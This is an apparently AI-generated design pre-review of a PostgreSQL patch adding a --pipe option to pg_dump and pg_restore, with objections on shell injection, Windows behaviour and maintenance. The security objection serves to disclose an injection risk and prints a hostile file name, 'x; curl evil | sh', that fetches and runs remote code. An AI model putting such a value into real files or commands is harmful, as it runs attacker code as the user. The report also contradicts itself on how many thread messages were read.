# Design pre-review: Adding pg_dump flag for parallel export to pipes

> Prepared by an AI harness; treat as a devil's advocate, not a verdict.

- CommitFest: [patch 5893](https://commitfest.postgresql.org/patch/5893/) (Needs review); authors: Hannu Krosing (hannukrosing), Nitin Motiani (nitinmotiani)
- Thread: [Adding pg_dump flag for parallel export to pipes](https://www.postgresql.org/message-id/flat/CAH5HC97p4kkpikar%2BswuC0Lx4YTVkE30sTsFX94tyzih7Cc_%3Dw%40mail.gmail.com), started 2025-04-07
- Messages read: 31 of 31
- Patch prose read: v21-0003-Add-documentation-for-pipe-in-pg_dump-and-pg_res.patch, v21-0002-Add-tests-for-pipe.patch, v21-0001-Add-pipe-support-for-directory-mode-of-pg_dump-a.patch, 002-pg_restore_pipe_v4.patch, 001-pg_dump_pipe_v4.patch, 004-pg_dump_documentation_v4.patch, 003-pg_dump_basic_tests_v4.patch (commit message, file list and doc hunks only; no code review)

## 1. Verdict

**NEEDS-COMMITTER-EYES** (confidence: medium)

The goal is clear and several independent participants asked for it, so levels 1a and 1b pass. Four fixable design objections survived at level 2. The decisive one is security-1: pg_restore --pipe puts file names read from the archive into a shell command without validation. standards-compat-2, maintenance-fit-1 and maintenance-fit-4 are smaller. None of them requires a different proposal.

First failing level, from the base up: **Level 2: architecture and design**. The review stops there; higher levels are not evaluated.

- Level 1a: understandability: passed
- Level 1b: desirability: passed
- Level 2: architecture and design: failed
- Levels 3-5 (implementation): out of scope

Provisional: Without the code, this review could not confirm whether pg_restore checks archive file names before substitution, or whether any path opens a blob TOC file twice. Only 3 of 31 messages were read in full, so later messages may already answer some of these points.

## The proposal, restated

**Problem.** In directory format (-Fd), pg_dump writes each table to its own file, so users cannot pipe the output to compression, throttling, ssh or cloud storage as they can with text format. This matters for parallel dumps (-j), which require the directory format and so need the full dump on local disk first. A reviewer added the case of streaming a parallel pg_dump straight into a parallel pg_restore.

**Proposed design.** A new --pipe option, first named --pipe-command, replaces --file or the filename for directory format and runs a shell command through popen for each archive file instead of fopen. A %f placeholder in the command is replaced with the file name that directory mode would use (toc.dat, <dump_id>.dat, blob files). pg_restore gets the same option to read each file from a command.

**User-visible surface.**
- pg_dump option --pipe=command, directory format only, cannot be used with --file or with --compress
- pg_restore option --pipe=command, cannot be used with the filename argument, works with -l and -L
- %f placeholder in the command, replaced with each archive file name
- Warning when --pipe is used with parallel jobs and the command has no %f
- Large object TOC file now opened in 'w' mode instead of 'ab', also without --pipe

**What the author claims.**
- Users can stream directory-format dumps to cloud storage, to a remote host over ssh with throttling, or through custom compression.
- A pipe command gives more choice of compression algorithm than the built-in --compress.
- Append mode for the large object TOC file is not needed, because _StartLOs runs once per archive entry.
- With these core changes, the rest of pg_dump works without change.

**Thread state.** Thomas Munro, Mahendra Singh Thalor and solai v found the idea useful, and solai v said the v17 series looks good after an end-to-end test. Dilip Kumar is a listed reviewer but has posted no review; v21 skips the tests on Windows and needs a rebase.

## 2. Prior attempts

No precedent found (corpus searched for items before 2025-04-07; 19 candidates retrieved, none is the same or a similar idea).

## 3. Objections a reviewer is likely to raise

### 1. pg_restore --pipe passes archive-supplied file names to the shell

fixable · level 2, rubric item 7 · security / privileges · `security-1`

A user runs pg_restore --pipe="cat dumpdir/%f" on a directory dump from a vendor, a bug report or a shared bucket. Someone has edited toc.dat or blob_NNN.toc so that one stored file name is `x; curl evil | sh`. pg_restore puts that text into the command and runs it with popen, and the user finds out only after the shell has run it.

In directory format, pg_restore reads each data file name back from toc.dat, and each large object file name from the blob TOC file. So with --pipe, the %f values come from the archive, not from pg_restore. Message #19 added shell escaping, and message #20 removed it because the command runs on the client. Today a tampered archive can at most make pg_restore open an unexpected path, but with --pipe it can run a shell command as the restoring user, and recent work on pg_dump and psql treats an untrusted dump or server as a real threat.

Thread: [#19 (Nitin Motiani, 2026-05-04)](https://www.postgresql.org/message-id/CAH5HC97skKgTkOBUipZjpOCXYc27txdzFL8UmVmBKaRvc4LO5A%40mail.gmail.com), [#20 (Nitin Motiani, 2026-05-07)](https://www.postgresql.org/message-id/CAH5HC95hD0tS2FKi8B6%3Do4g_Pf9WWbg8ZfD0Mu3m-h7ecfiK8A%40mail.gmail.com)

**Question:** How does pg_restore --pipe make sure a file name read from toc.dat or a blob TOC file cannot inject shell syntax, for example by checking it against the expected name pattern before substitution?

Counter-check: held. In directory format, pg_restore reads data file names from toc.dat and large object file names from the blob TOC file. Message #20 removed the escaping, and the visible material shows no validation of these names before they reach the shell.

### 2. Shell contract for --pipe is undefined on Windows

fixable · level 2, rubric item 10 · design, maintenance burden ("who maintains this in 10 years") · `standards-compat-2`

A Windows user copies a documented example such as --pipe="cat > dumpdir/%f". popen hands the command to cmd.exe, which has different quoting and tools, so the command fails or writes to the wrong place. The user finds out when the dump errors or the files are missing.

Message #31 skips all pipe tests on Windows because command parsing keeps failing, and message #20 removed shell escaping for the same reason. The documentation gives only POSIX shell examples and does not say which shell runs the command or how %f is quoted. A user-facing option whose meaning differs by platform, with no tests on one of them, leaves that platform without a defined contract.

Thread: [#19 (Nitin Motiani, 2026-05-04)](https://www.postgresql.org/message-id/CAH5HC97skKgTkOBUipZjpOCXYc27txdzFL8UmVmBKaRvc4LO5A%40mail.gmail.com), [#20 (Nitin Motiani, 2026-05-07)](https://www.postgresql.org/message-id/CAH5HC95hD0tS2FKi8B6%3Do4g_Pf9WWbg8ZfD0Mu3m-h7ecfiK8A%40mail.gmail.com), [#30 (Nitin Motiani, 2026-08-13)](https://www.postgresql.org/message-id/CAH5HC971uOCgqrmjcu0XDqdAeQ4tw5hAbtpzr82D%3DV5RW7Yfyw%40mail.gmail.com), [#31 (Nitin Motiani, 2026-08-15)](https://www.postgresql.org/message-id/CAH5HC96vrSWqTkiyN-ZU55mt90Tp4iUWz8bm8MYLcXEr-h8p-A%40mail.gmail.com)

**Question:** Which shell runs the --pipe command on Windows, how is a %f file name quoted there, and what test shows that it works?

Counter-check: held. Message #31 says command parsing keeps failing on Windows, and the docs give only POSIX shell examples. COPY PROGRAM and archive_command also depend on the platform shell, but they are shown to work there, and this option is not.

### 3. Overloading the file name field with a pipe command invites silent misuse

fixable · level 2, rubric item 9 · maintenance burden ("who maintains this in 10 years") · `maintenance-fit-1`

A later patch adds a code path in pg_restore or pg_dumpall that uses the archive file spec as a path and does not check the pipe flag. The user's shell command is then opened as a file name. The user sees a confusing "could not open" error, or the wrong file is read.

The patch stores the command in the existing file name variables and adds a bool next to them (message #1). Message #16 shows this has already happened twice. restore_global_objects needed the new flag added, and pg_restore --format=tar opened "cat" as a TOC file. pg_dumpall directory mode is left out (message #19), so the next patch that adds it has to find every such place by hand.

Thread: [#1 (Nitin Motiani, 2025-04-07)](https://www.postgresql.org/message-id/CAH5HC97p4kkpikar%2BswuC0Lx4YTVkE30sTsFX94tyzih7Cc_%3Dw%40mail.gmail.com), [#16 (Mahendra Singh Thalor, 2026-03-14)](https://www.postgresql.org/message-id/CAKYtNApb_aL%3DpsF%2B%3DVwjppTd717F4dGk_MVG9XW06OOW8LHRUQ%40mail.gmail.com), [#19 (Nitin Motiani, 2026-05-04)](https://www.postgresql.org/message-id/CAH5HC97skKgTkOBUipZjpOCXYc27txdzFL8UmVmBKaRvc4LO5A%40mail.gmail.com)

**Question:** Can the pipe command get its own field or type, so that code which treats it as a path fails to compile or fails a check?

Counter-check: held. Message #16 shows two places where the command was treated as a path: restore_global_objects, and --format=tar opening "cat" as a TOC file. The thread offers no mechanism that makes a missed check fail loudly.

### 4. Large object TOC mode change for all users bundled into feature

fixable · level 2, rubric item 4 · design, maintenance burden ("who maintains this in 10 years") · `maintenance-fit-4`

A user who never uses --pipe dumps a database whose large objects span several archive entries. If any path opens the same blob TOC file twice, the change from 'ab' to 'w' truncates it. The user finds out when the restore of large objects fails.

Message #1 left 'w' mode limited to pipe mode because the 'ab' code "has been there since the start". Message #19 then made it unconditional, with "If there is a concern, we can revert". The change affects every directory-format dump, and the only support offered is a reading of the call order of _StartLOs. As one hunk inside a 38 KB feature commit, it cannot be reviewed or reverted on its own.

Thread: [#1 (Nitin Motiani, 2025-04-07)](https://www.postgresql.org/message-id/CAH5HC97p4kkpikar%2BswuC0Lx4YTVkE30sTsFX94tyzih7Cc_%3Dw%40mail.gmail.com), [#19 (Nitin Motiani, 2026-05-04)](https://www.postgresql.org/message-id/CAH5HC97skKgTkOBUipZjpOCXYc27txdzFL8UmVmBKaRvc4LO5A%40mail.gmail.com)

**Question:** Can the 'ab' to 'w' change go in as a separate first commit, with a test showing that no path opens a blob TOC file twice?

Counter-check: held. The truncation scenario is hypothetical, since each blob TOC file belongs to one archive entry. The request still stands: message #19 changed behaviour for all directory dumps inside the feature commit, and a separate commit with its reasoning is a fair request.

## 4. Touch points

| Touch point | Hit | Why |
|---|---|---|
| on-disk format / pg_upgrade | no |  |
| WAL / replication / standby | no |  |
| wire protocol | no |  |
| catalog changes | no |  |
| ABI / extension API | no |  |
| SQL-standard conflict or non-standard syntax | no |  |
| new GUC | no |  |
| planner behaviour change | no |  |
| pg_dump / restore round-trip | **yes** | Directory archives are written and read through user commands, and the large object TOC file open mode changes for every directory dump. |
| psql UX conventions | no |  |
| security / privileges | **yes** | pg_restore --pipe substitutes file names read from toc.dat and blob TOC files into a command run with popen. |
| backpatchability | **yes** | The CommitFest entry sets target version to stable, but a new option can go to master only. |
| maintenance burden ("who maintains this in 10 years") | **yes** | A per-file popen path in pg_dump and pg_restore, a command stored in the file name field, and no Windows tests. |
| performance on the hot path | no |  |
| doesn't fit what Postgres is about (extension / external tool / already solved) | no |  |

## 5. Questions the author must answer before anyone reviews code

1. How does pg_restore --pipe stop a file name read from toc.dat or a blob TOC file from injecting shell syntax into the command?
2. Does --pipe work on Windows, and if it does not, will pg_dump and pg_restore reject the option there instead of skipping the tests?
3. Can the pipe command have its own field or type, so that code which treats it as a path fails a check instead of opening the command as a file?
4. Can the 'ab' to 'w' change for the large object TOC file be a separate first commit with a test for large objects split over several entries with -j?
5. When one pipe command fails part way through a parallel dump, what does pg_dump report, and what happens to the output already written by the other commands?

## Committability

"Will not get committed" is not the same as "should be rejected". The verdict above is about the merits (levels 1-2) only; this section is about who would sign for it, and it never changes the verdict.

- **Owner:** silent. Someone who knows the pg_dump archive formats and the parallel dump code, and who can judge command execution on Windows.
- **Liability:** The owner signs for a shell-command interface in pg_dump and pg_restore on all platforms, for as long as the option exists. The owner also signs for the large object TOC file mode change, which affects every directory-format dump.
- **Author follow-up:** Strong sign: the authors posted 21 versions since April 2025 and moved the entry forward through six CommitFests.

**Not now / show demand:** does not apply.

## Priority

Whether it is worth the reviewers' time now. This is apart from the verdict and never changes it.

- **Recommended action:** fix design first
- **Audience:** a sizeable minority
- **Maintenance burden:** medium
- **Review cost:** medium
- **Why:** Users of parallel dumps on large databases gain streaming without staging the full dump on local disk, and reviewers found the idea useful. The v21 core patch is about 38 KB across 17 files in src/bin/pg_dump. The file name validation and the Windows behaviour need answers before a committer can take it.

## Appendix

### Refuted in the counter-check

- `standards-compat-1` Archives written with --pipe are not readable as directory archives. Refuted (wrong facts): pg_restore finds directory-archive files, including toc.dat, by trying the .gz, .lz4 and .zst suffixes, so the gzip example should restore without the inverse command. For other transforms the user keeps the inverse, as with a text dump piped through a shell command today.
- `replication-ondisk-1` Large object TOC file mode change applies to every directory dump. Refuted (not specific): Duplicate of maintenance-fit-4. It names no code path that opens the same blob TOC file twice; each file is named after its archive entry and _StartLOs runs once per entry.
- `maintenance-fit-2` Feature ships untested on Windows with known parsing failures. Refuted (not specific): Duplicate of standards-compat-2, which covers the same Windows gap as a user interface contract. The missing tests are level 4 and the missing owner belongs in the committability field.
- `maintenance-fit-3` Pipe mode runs through every compression backend. Refuted (no failure scenario): The patch refuses --pipe with any compression, so a user cannot reach a compression backend that lacks pipe handling. The touched-files list alone does not show that each backend carries a popen variant; a changed open signature would touch the same files.
- `already-exists-1` Network filesystems and built-in compression already cover most listed use cases. Refuted (already handled): A mounted filesystem cannot stream a parallel dump into a parallel restore without a full copy on disk, which message #9 describes as a known limitation. Four independent participants called the feature useful, and FUSE mounts need extra software and privileges outside core.

### Review angles

- prior-attempts: 0 objection(s). No precedent found: the retrieved list has no earlier proposal of the same or a similar idea, and no thread message points to an earlier discussion of it. So the prior-attempts angle has no rejection reason to carry forward.
- standards-compat: 2 objection(s). Two fixable objections. The rename to --pipe and the %f placeholder follow existing practice and were settled in message #17.
- replication-ondisk: 1 objection(s). The proposal touches no server state, WAL, catalog or wire protocol. The archive layout stays the same apart from the large object TOC open mode.
- security: 1 objection(s). One objection, on pg_restore only. The pg_dump side builds %f from dump IDs and large object OIDs, and the command comes from the invoking user, so the feature grants no new privilege there.
- maintenance-fit: 4 objection(s). Demand and fit are not in question from this angle. The objections are about how the design will be maintained.
- already-exists: 1 objection(s). One objection only. COPY ... TO PROGRAM is an existing core precedent for this option, and message #9 shows a use case that a mount does not cover: streaming a parallel dump into pg_restore. Both lower the weight of the objection.
- demand: 0 objection(s). The material shows real demand from several independent people. In message #9 Andrew Jackson calls disk staging between parallel pg_dump and pg_restore a well-known limitation for large databases, and Thomas Munro (#4), Mahendra Singh Thalor (#16) and solai v (#25, #27) found it useful. The cost falls mostly on users of the new option, and no listed workaround gives per-file streaming with -j.

### Precedents retrieved

- P1: [pg_dump: optimize dumpFunc()](https://commitfest.postgresql.org/patch/5147/) (cf, Withdrawn, 2024-08-02) - judged not relevant; reason summarised from its thread
- P2: [Improve pg_dump dumping publication tables](https://commitfest.postgresql.org/patch/2728/) (cf, Withdrawn, 2021-01-15) - judged not relevant; reason summarised from its thread
- P3: [pg_dump --where option](https://commitfest.postgresql.org/patch/2600/) (cf, Returned with feedback, 2020-09-30) - judged not relevant; reason summarised from its thread
- P4: [pg_dump -C Grant statement on create database](https://commitfest.postgresql.org/patch/724/) (cf, Returned with feedback, 2016-10-03) - judged not relevant; reason summarised from its thread
- P5: [pg_dump new feature: exporting functions only](https://commitfest.postgresql.org/patch/3051/) (cf, Returned with feedback, 2022-04-07) - judged not relevant; reason summarised from its thread
- P6: [Ignore attributes of tables part of extensions in pg_dump](https://commitfest.postgresql.org/patch/164/) (cf, Rejected, 2015-02-23) - judged not relevant; reason summarised from its thread
- P7: [Improving test coverage of extensions with pg_dump](https://commitfest.postgresql.org/patch/187/) (cf, Returned with feedback, 2015-12-02) - judged not relevant
- P8: [Add --include-table-data-where option to pg_dump, to export only a subset of table data](https://commitfest.postgresql.org/patch/1644/) (cf, Returned with feedback, 2019-01-31) - judged not relevant; reason summarised from its thread
- P9: [Improve pg_restore toc file parsing and format for better performances](https://commitfest.postgresql.org/patch/4509/) (cf, Returned with feedback, 2024-01-14) - judged not relevant; reason summarised from its thread
- P10: [Add force flag while doing pg_restore to force dropping database in case of existing connections](https://commitfest.postgresql.org/patch/4485/) (cf, Returned with feedback, 2024-01-14) - judged not relevant
- P11: [Detect supported SET parameters when pg_restore is run](https://commitfest.postgresql.org/patch/803/) (cf, Returned with feedback, 2016-11-29) - judged not relevant
- P12: [pg_receivewal fail to streams when the partial file to write is not fully initialized present in the wal receiver directory](https://commitfest.postgresql.org/patch/3503/) (cf, Returned with feedback, 2024-01-22) - judged not relevant
- P13: [pg_receivewal fail to streams when the partial file to write is not fully initialized present in the wal receiver directory](https://commitfest.postgresql.org/patch/3668/) (cf, Withdrawn, 2022-07-20) - judged not relevant
- P14: [Custom compression methods](https://commitfest.postgresql.org/patch/1294/) (cf, Returned with feedback, 2019-09-30) - judged not relevant
- P15: [Restore lock level to update statusFlags](https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=dcfff74fb16622898a9d1df33e530f477caab095) (revert, Partially reverted, 2020-11-26) - judged not relevant
- P16: [Revert refactoring of restore command code to shell_restore.c](https://git.postgresql.org/gitweb/?p=postgresql.git;a=commit;h=2f6e15ac93c58c1140e4a4affe61e78f7346497a) (revert, Reverted, 2023-02-05) - judged not relevant
- P17: [automatic restore point](https://commitfest.postgresql.org/patch/1788/) (cf, Rejected, 2018-09-30) - judged not relevant
- P18: [Add <<none>> support to sepgsql_restorecon](https://commitfest.postgresql.org/patch/4022/) (cf, Returned with feedback, 2023-01-31) - judged not relevant
- P19: [Add <<none>> support to sepgsql_restorecon](https://commitfest.postgresql.org/patch/4158/) (cf, Returned with feedback, 2023-07-03) - judged not relevant

### Run

- Backend: claude CLI on the subscription login (no API key); models: review angles opus, counter-check claude-mythos-5-2, synthesis claude-mythos-5-2; no tools given to any of them
- LLM calls: 13; wall time: 165 s; cost reported by the CLI: $3.15
- Precedent enrichment: 8 thread(s) lacked a recorded reason: 7 from cache, 1 summarised now, 0 failed; quotes: 1 verified, 0 dropped; relevance pass: done, 0 of 19 kept
- Tone check: 92 text field(s) checked, 0 finding(s), 0 sentence(s) rewritten (repair call: not needed), 0 left
- Sanitizer: 0 link(s) removed, 0 unknown precedent id(s) dropped, 0 bad message reference(s) dropped, 0 unverifiable quote(s) dropped
- Generated: 2026-11-12T02:37:25.468Z by pgroast/0.1

---

Prepared by an AI harness; treat as a devil's advocate, not a verdict.
